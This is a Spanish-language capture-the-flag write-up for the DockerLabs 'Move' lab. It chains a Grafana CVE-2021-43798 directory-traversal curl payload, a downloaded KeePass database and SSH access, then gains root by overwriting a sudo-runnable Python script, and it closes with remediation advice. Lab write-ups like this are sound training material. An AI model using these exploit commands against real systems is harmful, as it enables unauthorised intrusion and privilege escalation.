---
title: "DockerLabs - Move"
difficulty: "Fácil"
source: "DockerLabs"
---

**Target:** 172.17.0.2
**Plataforma:** DockerLabs
**Dificultad:** Fácil
**Categoría:** Directory Traversal (CVE-2021-43798) · KeePass · SSH · Sudo misconfig (Python script writable)

**Descripción:** Laboratorio que encadena un Directory Traversal en Grafana (CVE-2021-43798) para extraer una contraseña almacenada en `/tmp/pass.txt`, que sirve como master password de una base de datos KeePass con credenciales SSH. La escalada de privilegios se consigue sobreescribiendo un script Python con permisos de escritura que `sudo` puede ejecutar sin contraseña.

---

## Despliegue

```bash
unzip move.zip
bash auto_deploy.sh move.tar
```

---

## Reconocimiento

### Nmap

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos abiertos:

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd 3.0.3 (anonymous login allowed) |
| 22/tcp | SSH | OpenSSH |
| 80/tcp | HTTP | Apache |
| 3000/tcp | HTTP | Grafana |

FTP tiene login anónimo habilitado y expone el directorio `mantenimiento/` con permisos `rwxrwxrwx`.

### FTP — enumeración anónima

```bash
ftp 172.17.0.2
# usuario: anonymous / password: (vacío)
```

Dentro de `mantenimiento/` hay un fichero `database.kdbx` (base de datos KeePass).

```bash
get database.kdbx
```

### Gobuster

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,conf,html,bak -b 301,302,404 -t 40
```

Rutas relevantes:
- `maintenance.html` — mensaje: *"Website under maintenance, access is in /tmp/pass.txt"*

---

## Explotación

### 1. Grafana CVE-2021-43798 — Directory Traversal

Grafana ≤ 8.3.0 permite leer ficheros arbitrarios del sistema a través del endpoint `/public/plugins/<plugin>/` sin autenticación. El plugin `alertlist` está presente por defecto.

```bash
curl --path-as-is "http://172.17.0.2:3000/public/plugins/alertlist/../../../../../../../../../tmp/pass.txt"
```

Resultado:

```
t9sH76gpQ82UFeZ3GXZS
```

### 2. KeePass — apertura de database.kdbx

La password obtenida es el **master password** de `database.kdbx`. Se abre con KeePassXC:

```bash
keepassxc database.kdbx
# Master password: t9sH76gpQ82UFeZ3GXZS
```

Credenciales encontradas dentro:
- **Usuario:** `freddy`
- **Contraseña:** `t9sH76gpQ82UFeZ3GXZS` (misma contraseña)

### 3. Acceso SSH

```bash
ssh freddy@172.17.0.2
# password: t9sH76gpQ82UFeZ3GXZS
```

---

## Escalada de privilegios

```bash
sudo -l
```

```
User freddy may run the following commands on 72ed2a295d71:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```

El fichero `/opt/maintenance.py` tiene permisos de escritura para `freddy`. Se sobreescribe con código que lanza una shell:

```bash
echo 'import os; os.system("/bin/bash")' > /opt/maintenance.py
sudo /usr/bin/python3 /opt/maintenance.py
```

```bash
whoami
# root
```

---

> DockerLabs no tiene flags en esta máquina — el objetivo es rootear el contenedor.

---

## Resumen de la cadena

| Fase | Vector | Resultado |
|------|--------|-----------|
| 1 | Grafana CVE-2021-43798 — Directory Traversal | Lectura de `/tmp/pass.txt` |
| 2 | Master password → KeePass `database.kdbx` | Credenciales `freddy` |
| 3 | SSH con credenciales de freddy | Acceso como freddy |
| 4 | Sudo NOPASSWD sobre script Python escribible | root |

---

## Remediación

- **Grafana:** actualizar a versión ≥ 8.3.1 o aplicar el parche del CVE-2021-43798. No exponer el panel de Grafana sin autenticación en interfaces públicas.
- **Secretos en `/tmp`:** no almacenar contraseñas en ficheros del sistema de ficheros temporal accesibles por cualquier proceso.
- **KeePass:** usar master password distinto de las credenciales que protege.
- **Sudo:** no otorgar `NOPASSWD` sobre scripts que el usuario pueda sobreescribir. Si el script es necesario, asegurarse de que pertenece a root y no tiene permisos de escritura para el usuario sudoer.
